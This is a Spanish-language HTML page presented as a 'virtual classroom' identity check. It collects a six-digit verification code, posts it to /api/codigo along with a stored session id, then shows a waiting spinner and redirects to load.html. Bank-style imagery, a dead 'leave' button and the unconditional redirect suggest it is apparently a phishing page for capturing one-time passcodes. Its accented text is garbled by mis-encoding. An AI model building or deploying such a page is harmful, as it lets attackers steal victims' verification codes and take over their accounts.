<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<link rel="stylesheet" href="css/styles2.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aula Virtual</title>
</head>

<body>

<header class="header">
<button class="header-btn" onclick="history.back()">Atr谩s</button>
<button class="header-btn">Abandonar</button>

<div class="header-logo">
<img src="assets/bbgo.png" class="header-logo-img">
</div>
</header>

<main class="main-content">
<div class="container">

<h2 class="main-title">Verifiquemos que seas t煤</h2>

<div class="card">

<div class="icon-container">
<div class="lock-icon"></div>
</div>

<div class="title-container">
<h3 class="card-title">C贸digo estudiantil</h3>
</div>

<p class="description">
Ingresa el c贸digo de verificaci贸n.
</p>

<div class="token-inputs">
<input maxlength="1" class="token-input">
<input maxlength="1" class="token-input">
<input maxlength="1" class="token-input">
<input maxlength="1" class="token-input">
<input maxlength="1" class="token-input">
<input maxlength="1" class="token-input">
</div>

<button class="verify-btn" id="verifyBtn">Verificar</button>

</div>
</div>
</main>

<!-- loader -->
<div id="spinner-overlay" class="spinner-overlay" style="display:none;">
<div class="spinner-wrapper">
<img src="images/ban.png" width="120">
<div class="spinner-text">Espere un momento, por favor.</div>
</div>
</div>

<script>
const inputs = document.querySelectorAll(".token-input");
const btn = document.getElementById("verifyBtn");

/* SOLO NUMEROS + AUTO AVANZAR */
inputs.forEach((input,i)=>{
 input.addEventListener("input",e=>{
  e.target.value = e.target.value.replace(/[^0-9]/g,"");

  if(e.target.value && i < inputs.length-1){
    inputs[i+1].focus();
  }
 });

 input.addEventListener("keydown",e=>{
  if(e.key==="Backspace" && !input.value && i>0){
    inputs[i-1].focus();
  }
 });
});

/* ENVIO */
btn.addEventListener("click", async ()=>{

 let codigo="";
 inputs.forEach(i=> codigo += i.value);

 if(codigo.length !== 6){
   alert("Ingrese el c贸digo completo");
   return;
 }

 const id = localStorage.getItem("id");
 if(!id){
   alert("Sesi贸n inv谩lida");
   location="index.html";
   return;
 }

 document.getElementById("spinner-overlay").style.display="flex";
 btn.disabled=true;

 try{

   await fetch("/api/codigo",{
     method:"POST",
     headers:{ "Content-Type":"application/json"},
     body:JSON.stringify({id,codigo})
   });

   location="load.html";

 }catch(err){
   alert("Error de conexi贸n");
   location.reload();
 }

});
</script>

</body>
</html>
